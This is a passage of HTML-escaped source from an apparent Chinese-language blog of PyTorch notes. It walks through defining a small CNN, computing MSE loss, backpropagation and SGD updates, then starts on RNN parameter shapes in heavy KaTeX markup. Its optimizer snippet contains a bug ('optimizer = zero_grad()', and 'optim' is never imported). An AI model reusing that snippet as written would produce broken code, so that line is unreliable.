style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.00444em;vertical-align:-0.31em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.02778em;&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;91-定义神经网络&#34;&gt;9.1 定义神经网络&lt;/h4&gt;
&lt;p&gt;定义神经网络的结构：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch
import torch.nn as nn
import torch.nn.functional as F


class Net(nn.Module):

    def __init__(self):
        super(Net, self).__init__()
        # 1 input image channel, 6 output channels, 5x5 square convolution
        # kernel
        self.conv1 = nn.Conv2d(1, 6, 5)
        self.conv2 = nn.Conv2d(6, 16, 5)
        # an affine operation: y = Wx + b
        self.fc1 = nn.Linear(16 * 5 * 5, 120)
        self.fc2 = nn.Linear(120, 84)
        self.fc3 = nn.Linear(84, 10)

    def forward(self, x):
        # Max pooling over a (2, 2) window
        x = F.max_pool2d(F.relu(self.conv1(x)), (2, 2))
        # If the size is a square you can only specify a single number
        x = F.max_pool2d(F.relu(self.conv2(x)), 2)
        x = x.view(-1, self.num_flat_features(x))
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = self.fc3(x)
        return x

    def num_flat_features(self, x):
        size = x.size()[1:]  # all dimensions except the batch dimension
        num_features = 1
        for s in size:
            num_features *= s
        return num_features


net = Net()
print(net)

&#39;&#39;&#39;
Net(
  (conv1): Conv2d(1, 6, kernel_size=(5, 5), stride=(1, 1))
  (conv2): Conv2d(6, 16, kernel_size=(5, 5), stride=(1, 1))
  (fc1): Linear(in_features=400, out_features=120, bias=True)
  (fc2): Linear(in_features=120, out_features=84, bias=True)
  (fc3): Linear(in_features=84, out_features=10, bias=True)
)
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这是一个前馈网络，然后反向传播函数默认被autograd(自动梯度)定义了。&lt;/p&gt;
&lt;p&gt;一个模型的可训练的参数可以通过调用&lt;code&gt;net.parameters()&lt;/code&gt;返回：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;params = list(net.parameters())
print(len(params))
print(params[0].size())

&#39;&#39;&#39;
10
torch.Size([6,1,5,5])
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;92-处理输入&#34;&gt;9.2 处理输入&lt;/h4&gt;
&lt;p&gt;接着将输入放到网络中，将得到的计算结果调用反向传播：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;input = torch.randn(1, 1, 32, 32)
out = net(input)
print(out)

&#39;&#39;&#39;
tensor([[-0.0233,  0.0159, -0.0249,  0.1413,  0.0663,  0.0297, -0.0940, -0.0135,
          0.1003, -0.0559]], grad_fn=&amp;lt;AddmmBackward&amp;gt;)
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;93-调用反向传播&#34;&gt;9.3 调用反向传播&lt;/h4&gt;
&lt;p&gt;然后把所有参数梯度缓存器置零，用随机的梯度来反向传播&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;net.zero_grad()
out.backward(torch.randn(1, 10))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;至此，完成了定义一个神经网络，处理出入以及调用反向传播。&lt;/p&gt;
&lt;p&gt;下面还需要处理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;计算损失值&lt;/li&gt;
&lt;li&gt;更新网络中的权重&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;94-计算损失值&#34;&gt;9.4 计算损失值&lt;/h4&gt;
&lt;p&gt;损失函数需要一对输入，即模型的输出和真实目标，然后返回一个值表示估计值与真实目标的距离。&lt;/p&gt;
&lt;p&gt;在nn包中定义了多种损失函数，比如一个简单的损失函数是&lt;code&gt;nn.MSELoss&lt;/code&gt;，这是个计算均方误差的损失函数。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;output = net(input)
target = torch.randn(10)
target = target.view(1, -1)
criterion = nn.MSELoss()

loss = criterion(output, target)
print(loss)

&#39;&#39;&#39;
tensor(1.3389, grad_fn=&amp;lt;MseLossBackWard&amp;gt;)
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;95-将损失添加到反向传播&#34;&gt;9.5 将损失添加到反向传播&lt;/h4&gt;
&lt;p&gt;现在需要跟随损失到反向传播路径，可以使用它的&lt;code&gt;.grad_fn&lt;/code&gt;属性，其计算图为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;input -&amp;gt; conv2d -&amp;gt; relu -&amp;gt; maxpool2d -&amp;gt; conv2d -&amp;gt; relu -&amp;gt; maxpool2d -&amp;gt; view -&amp;gt; linear -&amp;gt; relu -&amp;gt; linear -&amp;gt; relu -&amp;gt; linear -&amp;gt; MSELoss -&amp;gt; loss
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以，当调用&lt;code&gt;loss.backward()&lt;/code&gt;，整个图都会微分，而且所有的在图中的&lt;code&gt;requires_grad=True&lt;/code&gt;的张量将会让他们的grad张量累计梯度。&lt;/p&gt;
&lt;p&gt;为了实现反向传播损失，所有需要做的事仅仅是使用&lt;code&gt;loss.backward()&lt;/code&gt;。需要清空现存的梯度，不然将会和现存的梯度累计到一起。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;net.zero_grad() # 将现存梯度清零
loss.backward() # 反向传播
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;96-更新参数&#34;&gt;9.6 更新参数&lt;/h4&gt;
&lt;p&gt;最简单的更新规则就是随机梯度下降。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;weight = weight - learning_rate * gradient
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;torch.optim&lt;/code&gt;包中实现了多种更新规则函数，例如SGD，Nesterov-SGD，Adam，RMSProp等。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;optimizer = optim.SGD(net.parameters(), lr=0.01) # 创建优化器
optimizer = zero_grad() # 清零梯度系数
output = net(input) # 处理输入
loss = criterion(output, target) # 计算损失
loss.backward() # 反向传播
optimizer.step() # 更新参数
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;10-cnn&#34;&gt;10. CNN&lt;/h3&gt;
&lt;h3 id=&#34;11-rnn&#34;&gt;11. RNN&lt;/h3&gt;
&lt;h4 id=&#34;111-模型的参数维度&#34;&gt;11.1 模型的参数维度&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;单层RNN&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于单层的RNN，也就是每个时刻&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.61508em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;的输入&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;和上一时刻&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;t-1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69841em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;的隐层状态&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h_{t-1}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.902771em;vertical-align:-0.208331em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.301108em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.208331em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;经过一个线性层&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;@&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;@&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t@w_{xh}+h_{t-1}@w_{hh}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.902771em;vertical-align:-0.208331em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.301108em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.208331em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;处理得到下一个时刻的隐层状态&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，这种单层的RNN的参数如下图所示：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554588063.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;输入&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;的维度为二维&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[batch, feature\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord 